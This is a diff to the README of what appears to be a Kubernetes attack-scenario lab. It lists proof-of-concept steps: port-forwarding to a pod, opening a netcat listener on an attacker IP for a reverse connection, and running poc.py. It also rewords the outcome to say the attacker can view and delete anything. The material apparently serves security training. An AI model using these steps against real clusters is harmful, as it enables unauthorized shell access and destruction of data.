@@ -15,7 +15,7 @@ Used PoCs:
 3- Forward port `kubectl port-forward pods/scenario-1-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
 4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
 5- Run poc.py with your ip `./poc.py 144.122.139.40` \
-6- You are in!
+6- Attacker now can view and delete anything they want.
 
 ### Kubernetes
 Check https://learnk8s.io/deploying-nodejs-kubernetes for deployment tutorial
